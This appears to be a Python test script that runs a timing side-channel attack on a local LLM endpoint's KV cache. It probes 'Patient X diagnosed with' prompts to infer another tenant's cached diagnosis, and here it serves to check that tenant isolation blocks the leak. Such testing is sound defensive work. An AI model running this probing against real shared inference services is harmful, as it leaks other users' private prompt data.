#!/usr/bin/env python3
"""
Day 3 Deliverable: Timing side-channel exploitation script.
UPDATED: Uses tenant isolation – attacker uses tenant "attacker".
"""

import sys
import time
import statistics
import random
import httpx
import numpy as np
from rich.console import Console
from rich.table import Table
from rich.progress import track

BASE_URL = "http://127.0.0.1:8000"
PREDICT_ENDPOINT = f"{BASE_URL}/v1/predict"
BASE_PREFIX = "Patient X diagnosed with "
CANDIDATES = ["Cancer", "Diabetes", "Flu", "Asthma"]
REPEATS = 10
SEPARATION_THRESHOLD_MS = 50.0
P95_HIT_MAX_MS = 70.0
TENANT_ID = "attacker"   # Attacker uses a different tenant

console = Console()

def measure_ttft(prompt: str, client: httpx.Client) -> float:
    try:
        start = time.perf_counter()
        # Include tenant_id in the request body
        response = client.post(
            PREDICT_ENDPOINT,
            json={"prompt": prompt, "tenant_id": TENANT_ID},
            timeout=5.0
        )
        end = time.perf_counter()
        if response.status_code != 200:
            console.print(f"[red]Error {response.status_code} for prompt: '{prompt}'[/red]")
            return float('inf')
        return (end - start) * 1000.0
    except Exception as e:
        console.print(f"[red]Request failed for '{prompt}': {e}[/red]")
        return float('inf')

def run_attack():
    console.rule("[bold cyan]🔍 Secure KV Plane - Timing Side-Channel Attack[/bold cyan]")
    console.print(f"[yellow]Target Endpoint:[/yellow]    {PREDICT_ENDPOINT}")
    console.print(f"[yellow]Base Prefix:[/yellow]        '{BASE_PREFIX}'")
    console.print(f"[yellow]Candidates:[/yellow]         {CANDIDATES}")
    console.print(f"[yellow]Repeats Per Suffix:[/yellow] {REPEATS} (Total: {len(CANDIDATES) * REPEATS} queries)")
    console.print(f"[yellow]Tenant ID:[/yellow]          {TENANT_ID}")

    results = {candidate: [] for candidate in CANDIDATES}

    probe_sequence = []
    for _ in range(REPEATS):
        batch = CANDIDATES.copy()
        random.shuffle(batch)
        probe_sequence.extend(batch)

    with httpx.Client(timeout=10.0) as client:
        # Warm-up
        try:
            client.post(PREDICT_ENDPOINT, json={"prompt": "Warmup", "tenant_id": TENANT_ID})
        except Exception:
            console.print("[red]Failed to connect to server. Is it running on port 8000?[/red]")
            sys.exit(1)

        for candidate in track(probe_sequence, description="Probing target cache..."):
            full_prompt = BASE_PREFIX + candidate
            latency_ms = measure_ttft(full_prompt, client)
            results[candidate].append(latency_ms)

    # Statistics
    console.rule("[bold green]📊 Empirical Latency Distribution (ms)[/bold green]")
    table = Table(title="Observed TTFT Statistics")
    table.add_column("Rank", justify="center", style="dim")
    table.add_column("Candidate", style="cyan")
    table.add_column("Median (ms)", style="magenta")
    table.add_column("Mean (ms)", style="blue")
    table.add_column("p95 (ms)", style="yellow")
    table.add_column("Min (ms)", style="green")
    table.add_column("Max (ms)", style="red")
    table.add_column("Inferred State", justify="center")

    stats = {}
    for candidate in CANDIDATES:
        latencies = [l for l in results[candidate] if l != float('inf')]
        if not latencies:
            stats[candidate] = {"median": float('inf'), "mean": float('inf'), "p95": float('inf'), "min": float('inf'), "max": float('inf')}
            continue
        stats[candidate] = {
            "median": statistics.median(latencies),
            "mean": statistics.mean(latencies),
            "p95": float(np.percentile(latencies, 95)),
            "min": min(latencies),
            "max": max(latencies)
        }

    ranked = sorted(stats.items(), key=lambda item: item[1]["median"])

    for rank, (cand, s) in enumerate(ranked, start=1):
        state = "[bold green]HIT (TARGET)[/bold green]" if rank == 1 else "[dim]MISS[/dim]"
        table.add_row(
            str(rank),
            cand,
            f"{s['median']:.2f}",
            f"{s['mean']:.2f}",
            f"{s['p95']:.2f}",
            f"{s['min']:.2f}",
            f"{s['max']:.2f}",
            state
        )

    console.print(table)

    # Inference
    predicted_candidate, winner_stats = ranked[0]
    runner_up_candidate, runner_up_stats = ranked[1]
    separation_ms = runner_up_stats["median"] - winner_stats["median"]

    console.rule("[bold red]🎯 Gate Verification[/bold red]")
    console.print(f"Top Inferred Token: [bold]{predicted_candidate}[/bold] (Median: {winner_stats['median']:.2f} ms)")
    console.print(f"Runner-Up Token:   [bold]{runner_up_candidate}[/bold] (Median: {runner_up_stats['median']:.2f} ms)")
    console.print(f"Separation Score:  [bold]{separation_ms:.2f} ms[/bold] (Threshold: >= {SEPARATION_THRESHOLD_MS} ms)")

    # Check: Now we expect attack to FAIL because attacker's tenant has no cache.
    # So we check if separation is small (< threshold) and predicted is NOT "Cancer"
    gate_1 = (predicted_candidate == "Cancer")
    gate_2 = (separation_ms >= SEPARATION_THRESHOLD_MS)

    if gate_1 and gate_2:
        console.print("\n[bold red]❌ ATTACK SUCCESSFUL: Cache leak persists (should not happen with isolation!)[/bold red]")
        sys.exit(1)
    else:
        console.print("\n[bold green]✅ ATTACK BLOCKED: No significant timing difference (isolation works!)[/bold green]")
        if not gate_1:
            console.print(f" - Inferred '{predicted_candidate}' instead of 'Cancer'")
        if not gate_2:
            console.print(f" - Separation {separation_ms:.2f}ms < {SEPARATION_THRESHOLD_MS}ms")
        sys.exit(0)

if __name__ == "__main__":
    run_attack()
